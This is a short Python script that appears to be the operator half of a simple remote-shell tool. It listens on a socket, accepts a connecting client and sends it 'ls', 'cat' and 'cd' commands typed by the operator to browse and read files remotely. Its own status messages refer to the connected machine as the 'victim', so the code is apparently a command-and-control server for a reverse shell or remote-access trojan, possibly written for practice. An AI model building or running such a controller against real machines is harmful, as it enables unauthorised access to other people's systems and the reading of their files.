import socket 

ServerAddress = ('localhost', 998)
ValidCommands = ["ls", "cat" , "cd"]
CDErrorMessages = ["terminal does not support usage of .. yet","invalid path or directory"]
ACK = "ACK"

# we validate input  on the server side as well to avoid sending packets for commands that are clearly going to fail 
def ValidateInput(Command, Path):
	if(Command  not in ValidCommands):
		print("invalid command")
		return False
	if(Command != "ls" and Command != "close" and not Path):
		print("the specefied command requires a path")
		return False
	return True



# manage terminal session with client 
def HandleClient(ClientSocket):
	# get initial terminal path 
	TerminalCwd = ClientSocket.recv(1024).decode()
	try:
		while(True):
			# Parse input and validate syntax 
			UserInput = input("\n{}->".format(TerminalCwd))
			ParsedInput = UserInput.split(' ')
			if(len(ParsedInput) == 1 and ParsedInput[0] != "ls"):
				print("command requires a path")
				continue 
			if(len(ParsedInput) > 2):
				print("too many parameters")
				continue
			Command = ParsedInput[0]
			if(len(ParsedInput) == 2):
				Path = ParsedInput[1]
			else:
				Path = None
			if(ValidateInput(Command, Path)):

				# Send command 
				ClientSocket.send(UserInput.encode())

				# Get command output size and send ACK 
				ResultSize = ClientSocket.recv(8).decode()
				ClientSocket.send(ACK.encode())

				# receive the command result 
				CommandResult = ClientSocket.recv(int(ResultSize)).decode()
				# Handle the output  
				if(Command == "cd" and CommandResult not in CDErrorMessages):
					TerminalCwd = CommandResult
				if(Command != "cd" or CommandResult in CDErrorMessages):
					print(CommandResult)
	except:
		print("[*] victim client has been terminated!")
	finally:
		print("[*] closing terminal session...\n")
		ClientSocket.close()



def main():
	ServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	ServerSocket.bind(ServerAddress)

	while(True):
		# wait for client to connect 
		ServerSocket.listen(1)
		print("[*] waiting for client on : " , ServerAddress)
		ConnectionSocket , ClientAddr = ServerSocket.accept()
		print("[*] new connection from {} !".format(ClientAddr))
		HandleClient(ConnectionSocket)


main()


